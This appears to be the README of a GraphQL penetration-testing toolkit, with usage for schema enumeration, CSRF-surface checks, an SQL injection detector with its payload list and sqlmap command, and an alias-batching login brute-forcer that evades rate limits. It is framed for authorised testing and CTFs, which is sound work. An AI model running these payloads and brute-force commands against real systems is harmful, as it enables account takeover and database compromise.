# GraphQL-Scripts

Security testing toolkit for GraphQL endpoints. Covers schema discovery, permission enumeration, query generation, SQL injection detection, and alias-based brute-forcing.

> **Authorization only.** Run these tools exclusively on systems for which you have explicit written permission.

---

## Tools at a glance

| Tool | What it does |
|---|---|
| [qgen](#qgen) | Interactive query generator: lists schema methods and builds full queries |
| [effuzz](#effuzz) | Endpoint fuzzer: enumerates ops and checks accessibility (ffuf-style output) |
| [sqli](#sqli) | SQLi detector: tests string arguments with SQL payloads, writes sqlmap markers |
| [alias_brute](#alias_brute) | Alias brute-force: bypasses rate limiters via GraphQL alias batching |

---

## Requirements

- Python 3.7+
- `requests` (all tools)
- `colorama` (optional — coloured output in `sqli`)

```bash
pip install -r requirements.txt
```

---

## Project structure

```
GraphQL-Scripts/
├── core/
│   ├── introspection.py   # Fetch, load, save, and bypass-test introspection
│   ├── http.py            # Header parsing and cookie file helpers
│   └── output.py          # ANSI colours and colorama re-exports
├── qgen/
│   └── qgen.py            # Interactive query generator
├── effuzz/
│   └── effuzz.py          # Endpoint fuzzer
├── sqli/
│   └── sqli_detector.py   # SQL injection detector
└── alias_brute/
    └── alias_brute.py     # Alias-based brute-force
```

---

## Recommended workflow

```
1. effuzz --discover    →  find the endpoint and map accessible operations
2. qgen                 →  generate full queries for interesting methods
3. sqli                 →  probe string arguments for SQL injection
4. alias_brute          →  brute-force if rate limiting is suspected
```

### End-to-end example

```bash
# 1. Map accessible operations (auto-discovers endpoint if needed)
python3 effuzz/effuzz.py --url https://target.com \
  -H "Cookie: session=abc123" --filter-code 401

# 2. Check CSRF surface while we're at it
python3 effuzz/effuzz.py --url https://target.com/graphql --check-methods

# 3. Generate queries for a method of interest
python3 qgen/qgen.py --url https://target.com/graphql \
  -H "Authorization: Bearer TOKEN"
# qgen $ use getUser

# 4. Scan for SQLi
python3 sqli/sqli_detector.py https://target.com/graphql \
  '{"Authorization":"Bearer TOKEN"}' --crawl

# 5. Brute-force a login (if rate limiting is bypassed via aliases)
python3 alias_brute/alias_brute.py https://target.com/graphql \
  --field login --username carlos --wordlist /usr/share/wordlists/rockyou.txt
```

---

## qgen

Interactive CLI that loads a GraphQL schema (from file or auto-introspection) and generates complete query/mutation documents with all nested fields and example variable values.

### Usage

```bash
python3 qgen/qgen.py --url URL [options]
```

### Options

| Flag | Description |
|---|---|
| `--url URL` | GraphQL endpoint URL (required) |
| `-H "Name: Value"` | HTTP header, repeatable |
| `--cookie FILE` | Cookie file (one line) |

Before running introspection, qgen sends `{__typename}` to confirm the endpoint is live. If the standard introspection query is blocked, it automatically retries with the newline-bypass variant (`__schema\n{...}`).

### Interactive commands

| Command | Description |
|---|---|
| `listMethods` | List all query `(Q)` and mutation `(M)` methods |
| `listMethods \| grep <text>` | Filter the list |
| `use <n\|name>` | Generate the full query for that method and save it |
| `help` | Show command list |
| `exit` | Quit |

### Example session

```
$ python3 qgen/qgen.py --url https://target.com/graphql \
    -H "Authorization: Bearer TOKEN"

[+] Endpoint confirmed — __typename: Query
[+] Introspection obtained.
[+] Schema loaded: 42 queries, 8 mutations

qgen $ listMethods | grep user
 [3]  (Q) getUser
 [4]  (Q) listUsers
 [14] (M) createUser

qgen $ use 3
[+] Selected: getUser

----------------------------------------
query getUser($id: ID!) {
  getUser(id: $id) {
    id
    username
    email
    role
  }
}
----------------------------------------
[+] Query saved to: queries/getUser.txt
```

Generated queries are saved to `queries/<methodName>.txt`.

---

## effuzz

Lightweight GraphQL fuzzer. Fetches the schema, enumerates every query and mutation, and sends a minimal request for each to gauge accessibility — similar to ffuf but for GraphQL operations.

### Usage

```bash
python3 effuzz/effuzz.py --url URL [options]
```

### Options

| Flag | Description |
|---|---|
| `--url URL` | GraphQL endpoint URL or base URL (e.g. `https://target.com`) |
| `--check-methods` | Test GET query-param and form-urlencoded POST support (CSRF surface) |
| `-H "Name: Value"` | HTTP header, repeatable |
| `--cookie FILE` | Cookie file (one line) |
| `--variables FILE` | JSON file with variables to include in every request |
| `-s / --silent` | Hide 401 responses |
| `--match-code CODES` | Show only these status codes (e.g. `200,400`) |
| `--filter-code CODES` | Hide these status codes (e.g. `401,403`) |
| `--debug` | Print full response body for each request |

### Auto-discovery

If `--url` doesn't respond as a GraphQL endpoint, effuzz automatically probes these paths and uses the first one that replies with a valid `__typename`:

```
/graphql  /api/graphql  /graphiql  /graphql/console
/api      /graphql/api  /graphql/graphql  /graphql.php
```

You can pass either the full endpoint (`https://target.com/graphql`) or just the base URL (`https://target.com`) — discovery handles both.

### --check-methods (CSRF surface)

Tests two request types that bypass CORS preflight:

1. **GET** with `?query={__typename}` — exploitable without preflight if accepted
2. **POST** with `Content-Type: application/x-www-form-urlencoded` — same

If either is accepted and auth relies solely on session cookies, CSRF is likely possible.

### Examples

```bash
# Auto-discover endpoint and fuzz (pass base URL or full path — both work)
python3 effuzz/effuzz.py --url https://target.com \
  -H "Authorization: Bearer TOKEN"

# Check CSRF surface
python3 effuzz/effuzz.py --url https://target.com/graphql --check-methods

# Show only accessible methods
python3 effuzz/effuzz.py --url https://target.com/graphql \
  --filter-code 401,403 -H "Authorization: Bearer TOKEN"

# Debug: print full response body for each method
python3 effuzz/effuzz.py --url https://target.com/graphql --match-code 200 --debug
```

### Output interpretation

| Status | Meaning |
|---|---|
| `200` (green) | Request succeeded, response has no `errors` |
| `200` (yellow) | Request reached the server but response contains `errors` |
| `400` | Malformed query — server accepted the request; method likely exists |
| `401` / `403` | Authentication or authorisation required |
| `500` | Server error — worth investigating |

---

## sqli

SQL injection detector for GraphQL. Performs introspection, seeds argument values via optional BFS crawling, and tests every string-type argument with a curated set of SQL payloads. Writes reproducible `.http` marker files for sqlmap.

### Usage

```bash
python3 sqli/sqli_detector.py <endpoint> [headers] [options]
```

### Options

| Flag | Description |
|---|---|
| `endpoint` | GraphQL endpoint URL (required) |
| `headers` | Optional headers: JSON object string or `"Name: Value"` pairs |
| `--crawl` | BFS crawl to extract real values for smarter argument seeding |
| `--crawl-depth N` | BFS depth (default: 2) |
| `--max-requests N` | Request cap during crawl (default: 250) |
| `--max-items N` | Items per list to inspect (default: 10) |
| `--crawl-delay S` | Delay between requests in seconds (default: 0) |
| `--verbose` | Print queries and debug information |

### Payloads tested

```
'" OR "1"="1     ' OR '1'='1     ' OR 1=1--
admin' --        x' UNION SELECT NULL--
"' OR 1=1 --     '    admin'/*    admin"/*
```

### Evidence types

| Type | Description |
|---|---|
| `SQL_ERROR` | SQL error message appears in the GraphQL `errors` array |
| `RESPONSE_DIFF` | Full-selection attack response differs from baseline |
| `NULL_ON_ATTACK` | Attack returns null while baseline returned data |
| `RESPONSE_DIFF_SIMPLE` | `__typename` differs between baseline and attack |

All evidence types go through confirmation rules to reduce false positives before being reported.

### Examples

```bash
# Basic scan
python3 sqli/sqli_detector.py https://target.com/graphql \
  '{"Authorization":"Bearer TOKEN"}'

# With crawling for better argument seeding
python3 sqli/sqli_detector.py https://target.com/graphql \
  '{"Authorization":"Bearer TOKEN"}' \
  --crawl --crawl-depth 3 --max-requests 500

# Verbose (see every query sent)
python3 sqli/sqli_detector.py https://target.com/graphql --verbose
```

### Marker files and sqlmap

Findings are saved to `repro-payloads/<field>_<arg>_<hash>_marker.http`. Each file is a raw HTTP POST with the payload replaced by `*` — ready for sqlmap:

```bash
sqlmap --level 5 --risk 3 \
  -r repro-payloads/user_username_abc12345_marker.http \
  -p "JSON[query]" --batch --skip-urlencode --parse-errors --random-agent
```

An index of all findings is kept at `repro-payloads/index.json`.

---

## alias_brute

Bypasses GraphQL rate limiters by batching hundreds of login attempts as aliases inside a **single HTTP request**. Rate limiters that count HTTP requests but not operations per request are trivially bypassed.

### How it works

```graphql
mutation {
  bruteforce0: login(input: {username: "carlos", password: "123456"}) { token }
  bruteforce1: login(input: {username: "carlos", password: "password"}) { token }
  bruteforce2: login(input: {username: "carlos", password: "qwerty"}) { token }
  ...100 more per request...
}
```

One HTTP request contains 100 attempts. A 10 req/s rate limit becomes effectively 1 000 attempts/s.

### Usage

```bash
python3 alias_brute/alias_brute.py <endpoint> \
  --field FIELD --username USER --wordlist FILE [options]
```

### Options

| Flag | Description |
|---|---|
| `endpoint` | GraphQL endpoint URL (required) |
| `--field NAME` | Mutation/query field to target (e.g. `login`) |
| `--arg-user NAME` | Username argument name (default: `username`) |
| `--arg-pass NAME` | Password argument name (default: `password`) |
| `--username VALUE` | Username for all attempts |
| `--wordlist FILE` | Password wordlist, one per line |
| `--success-field NAME` | Field to check for non-null value (default: `token`) |
| `--operation TYPE` | `mutation` or `query` (default: `mutation`) |
| `--batch-size N` | Aliases per HTTP request (default: 100, max: 1000) |
| `--no-input-wrapper` | Use flat args instead of `input: {...}` wrapper |
| `-H "Name: Value"` | HTTP header, repeatable |
| `--cookie FILE` | Cookie file (one line) |
| `--timeout S` | Request timeout in seconds (default: 30) |
| `--verbose` | Print generated payload before each batch |

### Examples

```bash
# Standard login with 'input' wrapper (most common)
python3 alias_brute/alias_brute.py https://target.com/graphql \
  --field login \
  --username carlos \
  --wordlist /usr/share/wordlists/rockyou.txt \
  -H "Authorization: Bearer UNAUTHENTICATED_TOKEN"

# Flat args (no 'input' wrapper)
python3 alias_brute/alias_brute.py https://target.com/graphql \
  --field authenticate \
  --arg-user email --arg-pass password \
  --username admin@target.com \
  --wordlist passwords.txt \
  --no-input-wrapper

# Check 'success' field instead of 'token'
python3 alias_brute/alias_brute.py https://target.com/graphql \
  --field login --username carlos \
  --wordlist passwords.txt \
  --success-field jwt
```

### Sample output

```
[*] Target:       https://target.com/graphql
[*] Operation:    mutation { login(input: {...}) }
[*] Username:     carlos
[*] Wordlist:     500 passwords
[*] Batch size:   100 aliases/request → 5 request(s)
[*] Success on:   non-null 'token'

[*] Batch 1/5 (#1–#100)... HTTP 200 (no hit)
[*] Batch 2/5 (#101–#200)... HTTP 200 (no hit)
[*] Batch 3/5 (#201–#300)... HTTP 200

[+] SUCCESS — alias bruteforce47
    Password:  letmein
    token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
```

---

## Security & ethics

- These tools **actively probe targets**. Use them only on systems you are authorised to test.
- Automated scanning can trigger alarms, rate limits, account lockouts, or WAF bans.
- Inspect `.http` marker files before running sqlmap or any other automated follow-up tool.
- These tools are intended for authorised penetration testing, CTF competitions, and security research.
